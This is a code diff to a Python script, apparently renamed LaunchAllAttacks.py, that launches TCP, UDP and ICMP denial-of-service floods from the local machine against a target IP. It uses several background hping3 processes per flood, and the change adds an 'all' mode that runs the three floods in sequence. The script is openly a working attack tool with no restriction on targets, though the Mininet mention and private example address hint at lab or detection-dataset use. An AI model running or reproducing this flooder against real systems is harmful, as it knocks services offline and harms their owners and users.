@@ -4,7 +4,7 @@ from time import sleep
 
 def launch_attack(attack_type, num_processes, duration_sec, target_ip):
     """
-    Launches a DDoS attack directly from this machine's command line.
+    Launches a specific type of DDoS attack directly from this machine.
     This does NOT use a virtual Mininet topology.
     """
     
@@ -15,7 +15,7 @@ def launch_attack(attack_type, num_processes, duration_sec, target_ip):
     }
 
     if attack_type not in attack_commands:
-        print(f"Error: Invalid attack type '{attack_type}'. Please choose from {list(attack_commands.keys())}.")
+        print(f"Error: Invalid attack type '{attack_type}'.")
         return
 
     command = attack_commands[attack_type]
@@ -25,9 +25,8 @@ def launch_attack(attack_type, num_processes, duration_sec, target_ip):
     print(f"Attacker: This machine ({os.uname()[1]})")
     print(f"Number of Attack Processes: {num_processes}")
     print(f"Duration: {duration_sec} seconds")
-    print("-" * 20)
     print(f"Executing command: {command}")
-    print("-" * 20)
+    print("------------------------------------------")
 
     # Launch multiple attack processes in the background
     for i in range(num_processes):
@@ -38,17 +37,16 @@ def launch_attack(attack_type, num_processes, duration_sec, target_ip):
     print(f"\nAttack in progress. Waiting for {duration_sec} seconds...")
     sleep(duration_sec + 2)
 
-    # Clean up any remaining hping3 processes
-    os.system('killall hping3')
-    print("\nAttack finished.")
+    os.system('killall hping3 > /dev/null 2>&1')
+    print(f"\n--- {attack_type.upper()} Attack Finished ---")
 
 
 if __name__ == '__main__':
     if len(sys.argv) != 5:
-        print("\nUsage: sudo python LaunchAttack.py <attack_type> <num_processes> <duration_sec> <target_ip>")
-        print("  <attack_type>: tcp, udp, or icmp")
+        print("\nUsage: sudo python LaunchAllAttacks.py <attack_type> <num_processes> <duration_sec> <target_ip>")
+        print("  <attack_type>: tcp, udp, icmp, or 'all' to run all three in sequence")
         print("  <num_processes>: Number of concurrent attack processes to run (e.g., 5)")
-        print("  <duration_sec>: e.g., 120")
+        print("  <duration_sec>: Duration for EACH attack type in the sequence (e.g., 60)")
         print("  <target_ip>: e.g., 10.0.2.5\n")
         sys.exit(1)
 
@@ -58,7 +56,28 @@ if __name__ == '__main__':
         attack_duration = int(sys.argv[3])
         target = sys.argv[4]
         
-        launch_attack(attack_name, process_count, attack_duration, target)
+        # --- NEW: Logic to handle the 'all' keyword ---
+        if attack_name == 'all':
+            print("====== LAUNCHING ALL ATTACKS IN SEQUENCE ======")
+            
+            # 1. TCP Attack
+            launch_attack('tcp', process_count, attack_duration, target)
+            print("\nPausing for 15 seconds before next attack stage...")
+            sleep(15)
+            
+            # 2. UDP Attack
+            launch_attack('udp', process_count, attack_duration, target)
+            print("\nPausing for 15 seconds before next attack stage...")
+            sleep(15)
+
+            # 3. ICMP Attack
+            launch_attack('icmp', process_count, attack_duration, target)
+
+            print("\n====== ALL ATTACK STAGES COMPLETE ======")
+            
+        else:
+            # This is the original logic for single attacks
+            launch_attack(attack_name, process_count, attack_duration, target)
         
     except ValueError:
         print("Error: Please provide valid integers for num_processes and duration_sec.")
